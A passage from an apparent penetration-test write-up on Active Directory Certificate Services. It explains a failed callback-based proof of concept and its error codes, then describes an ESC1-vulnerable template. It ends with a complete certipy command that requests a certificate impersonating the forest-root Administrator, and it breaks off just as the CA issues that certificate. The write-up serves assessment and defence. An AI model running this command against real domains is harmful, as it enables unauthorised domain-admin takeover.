203.0.113.25/32    VPN address: outbound access worked, inbound callback did not
198.51.100.25      Office address: no CA callback reached ports 389 or 445

Adding a local firewall rule did not change the result because the packets never arrived. The remaining options would have been to run the PoC from an internal Linux system, use an authorised internal forwarding point capable of receiving connections on ports 389 and 445, or temporarily permit the specific CA-to-assessment-host flows. None was available within the assessment setup.

At this point, repeated attempts would only have created additional failed CA requests. The technical blocker was understood, and the assessment moved back to certificate template enumeration.

Error Interpretation

ept_s_not_registered meant the certificate RPC interface was not available at the endpoint selected by the PoC. In this case, the request had been sent to a DC instead of the CA.

0x80094012 meant the CA policy module denied enrolment. In this case, the requesting computer belonged to the child domain while the template permitted the forest-root Domain Computers group.

0x800706ba meant the request entered the callback-dependent processing path but the CA could not complete the callback. In this case, neither the VPN address nor the office address was reachable from the CA on the rogue service ports.

None of these errors independently proved that the CA was patched. Each described a different failed prerequisite around endpoint selection, authorisation or network reachability.

AD CS Certificate Template Security

Active Directory Certificate Services uses certificate templates to define who may enrol, how the subject identity is constructed, which approval steps apply, and what the resulting certificate can be used for. A certificate intended only for a web server should normally be restricted to the relevant systems and should not unintentionally provide a general-purpose client authentication identity.

The Extended Key Usage values are particularly important. A certificate that permits client authentication may be accepted for authentication to Active Directory. If the requester can also control the subject or Subject Alternative Name, the certificate can potentially be issued for a different user or computer identity.

ESC1 describes a dangerous combination in which a low-privileged principal can enrol in an authentication-capable template and supply the identity placed in the certificate, without protective approval or signature requirements. The issue is a configuration weakness rather than a software vulnerability, and it remains exploitable even when the CA operating system is fully patched.

The relevant conditions can be summarised as follows:

The template is enabled on a CA
A low-privileged principal has enrolment rights
The enrollee can supply the subject or alternative identity
The certificate supports client authentication or an equivalent authentication purpose
Manager approval is not required
No authorised signatures are required

ESC1 Certificate Template Identification

Template enumeration identified an anonymised template referred to here as LegacyWebTLS. It appeared to have been created for server certificates, but its configuration also permitted client authentication.

Template: LegacyWebTLS
Enabled: True
Client Authentication: True
Server Authentication: True
Enrollee Supplies Subject: True
Requires Manager Approval: False
Authorised Signatures Required: 0
Enrolment Rights: Authenticated Users

This template did not contain the DNS name flags required by the CertiGhost PoC, so changing the PoC's --template value to LegacyWebTLS would not have solved the callback problem. It was nevertheless directly vulnerable to ESC1.

The distinction was important. The Machine template had the behaviour CertiGhost needed but initially denied the requesting principal. LegacyWebTLS granted the requesting principal enrolment rights and allowed identity control but did not trigger CertiGhost. They represented different attack paths despite both being AD CS templates.

ESC1 Network Requirements

The ESC1 route used a normal certificate request from the assessment host to the CA. It did not require the CA, a domain controller or another server to initiate a connection back to Kali.

CertiGhost: attacker -> CA request, then CA -> attacker callback
ESC8 relay: victim -> attacker authentication, then attacker -> web enrolment
ESC1: attacker -> CA request only

The assessment host already had permission to connect to the CA's certificate RPC interface. The low-privileged account was included in the template's effective enrolment rights. Consequently, the office and VPN restrictions that blocked CertiGhost and would also have complicated conventional ESC8 relay did not prevent ESC1.

Privileged Certificate Request

The successful request used fictional values in the example below. The requester authenticated as a low-privileged child-domain user but asked the vulnerable template to include the forest-root Administrator UPN and SID.

CERTIPY=$(command -v certipy-ad || command -v certipy); "$CERTIPY" req -u 'audit.user@child.example' -p "$USER_PASS" -dc-ip 192.0.2.10 -target 'CA01.corp.example' -target-ip 192.0.2.30 -ca 'CORP-CA' -template 'LegacyWebTLS' -upn 'administrator@corp.example' -sid 'S-1-5-21-1111111111-2222222222-3333333333-500' -out 'administrator_corp.pfx' -debug

The CA accepted the request and returned a certificate containing the requested privileged identity:
